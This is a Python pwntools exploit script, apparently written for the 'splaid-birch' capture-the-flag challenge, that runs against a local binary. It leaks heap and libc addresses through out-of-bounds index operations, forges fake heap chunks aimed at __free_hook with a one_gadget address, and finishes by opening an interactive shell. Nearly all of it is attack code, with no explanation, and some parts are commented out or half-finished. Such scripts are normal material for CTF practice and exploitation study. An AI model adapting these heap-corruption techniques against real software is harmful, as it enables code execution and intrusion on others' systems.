#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

p = process("./splaid-birch", env={"LD_PRELOAD":"./libsplaid.so.1"})
#p = remote("splaid-birch.pwni.ng", 17579)
raw_input("")

# offer a group of input

group = {"op": 0, "i1" : 0, "i2" : 0, "i3" : 0}

def fill(op, i1, i2, i3):

    group["op"] = op
    group["i1"] = i1 
    group["i2"] = i2 
    group["i3"] = i3 

def sendvals():

    op = group['op']
    i1 = group['i1']
    i2 = group['i2']
    i3 = group['i3']
    if op <= 4:
        p.sendline(str(op) + " " + str(i1))
        print("[*]send opNum " + str(op) + " i1 "+str(i1))
    if op == 5 or op == 6 :
        p.sendline(str(op) + " " + str(i1) + " " + str(i2))
        print("[*]send opNum " + str(op) + " i1 " + str(i1) + " i2 " + str(i2))
    if op == 7:
        p.sendline(str(op) + " " + str(i1) + " " + str(i2) + " " + str(i3))
        print("[*]send opNum " + str(op) + " i1 " + str(i1) + " i2 " + str(i2) + " i3 " + str(i3))
    


def sp_del(i1,i2,i3):

    fill(1, i1, i2, i3)
    sendvals()

def sp_get(i1,i2,i3):

    fill(2,i1,i2,i3)
    sendvals()
    data = p.recv()
    print data

def sp_nth(i1,i2,i3):

    fill(3,i1,i2,i3)
    sendvals()
    data = p.recv()
    print data

def sp_select(i1,i2,i3):

    fill(4,i1,i2,i3)
    sendvals()
    data = p.recv()
    return data

def sp_add(i1,i2,i3):

    fill(5,i1,i2,i3)
    sendvals()

def isolate(i1,i2,i3):

    fill(6,i1,i2,i3)
    sendvals()
    data = p.recv()
    print data

def isolate2(i1,i2,i3):

    fill(7,i1,i2,i3)
    sendvals()

# uninitial 

for i in range(10):
    sp_add(8+i,37+i,0)
for i in range(2,10):
    sp_del(8+i,0,0)

sp_del(13,0,0)
sp_add(18, 37+10,0)



off = -0x2b0+(1<<64)
heap = sp_select(off,0,0)
heap_addr = int(heap)
heap_base = heap_addr - 0x1320

raw_input(hex(heap_addr))


for i in range(149):

    sp_add(20+i, 58+i,0)

# 2e30

sp_add(heap_base + 0x2e30, 0xdeadbeef,0)

off2 = -0x50//8 + (1<<64)
data = sp_select(off2,0,0)
libc_base = int(data) - 0x3ebca0
print hex(libc_base)

free_hook = libc_base + 0x3ed8e8
one = libc_base + 0x4f440

raw_input("stop")

# form input and test select 

# trigger select 

offset1 = -0x4890//8 + (1<<61)
offset2 = -0x4830//8 + (1<<61)

heap_target = heap_base + 0x800

sh = u16('sh')

payload = "4 " + str(offset1) + " "

payload += "1 {:d} ".format(sh)

payload = payload.ljust(0xf0, "\0")
payload += p64(heap_base+0x3c0) + p64(0)


# should be free_hook | heap_addr


def gen_struct(heap_target):
    pay = p64(heap_target) + p64(0xffffff0000000000) + p64(0) * 2 + p64(heap_target) + p64(0xffffff0000000000) + p64(0)*2 + p64(heap_target) + p64(0xffffff0000000000) 
    return pay





#content start 

target_byte1 = p64(one)[0]
target_byte2 = p64(one)[1]
target_byte3 = p64(one)[2]
target_byte4 = p64(one)[3]
target_byte5 = p64(one)[4]
target_byte6 = p64(one)[5]


heap_target1 = heap_target + ord(target_byte1)-0x28

heap_target2 = heap_target + 0x100 + ord(target_byte2)-0x28

heap_target3 = heap_target + 0x200 + ord(target_byte3)-0x28

heap_target4 = heap_target + 0x300 + ord(target_byte4)-0x28

heap_target5 = heap_target + 0x400 + ord(target_byte5)-0x28

heap_target6 = heap_target + 0x500 + ord(target_byte6)-0x28

heap_target7 = heap_target + 0x600 

heap_target8 = heap_target + 0x700 







# 
'''
payload += gen_struct(heap_target1)
payload += gen_struct(heap_target2)
payload += gen_struct(heap_target3)
payload += gen_struct(heap_target4)
payload += gen_struct(heap_target5)
payload += gen_struct(heap_target6)
payload += gen_struct(heap_target7)
payload += gen_struct(heap_target8)
'''

top_chunk = libc_base + 0x3ebca0 
printf_func_table = libc_base + 0x3f0658
printf_vtable_list= libc_base + 0x3ec870
stdin_buffer = libc_base + 0x3eba00

#payload += gen_struct(heap_target1)
#payload += gen_struct(heap_target2)

chunk2_addr = heap_base + 0x410
#fake #1 
payload += p64(sh) + p64(one-8) + p64(one) + p64(one+8)
payload += p64(121) + p64(chunk2_addr+0x28) + p64(0) + p64(free_hook-8+0x20) + p64(0) + p64(0)

#fake #2
payload += p64(one+0x100) + p64(one+0x200) + p64(one+0x300) + p64(one+0x400)
payload += p64(124) + p64(0) * 5


payload = payload.ljust(0x540, "a")

pair2 = ""


'''
#write printf func table var
off1 = heap_target1 % 8
padding1 = 'b' * (off1)
pair2 += padding1 

pair2 += p64(printf_vtable_list) * ((heap_target1-heap_target)/8) + p64(printf_vtable_list+8) * 8

#test 


#pair2 += p64(free_hook) * ((heap_target1-heap_target)/8+2) + p64(free_hook) * 6
pair2 = pair2.ljust(0x100, '\0')

off2 = heap_target2 % 8
padding2 = 'b' * (off2)
pair2 += padding2
pair2 += p64(printf_func_table) * ((heap_target2-0x100-heap_target)/8) + p64(printf_func_table) * 8
pair2 = pair2.ljust(0x200, '\0')
'''

raw_input("wait")

payload += pair2
print len(payload)

p.sendline(payload)

p.interactive()
 




















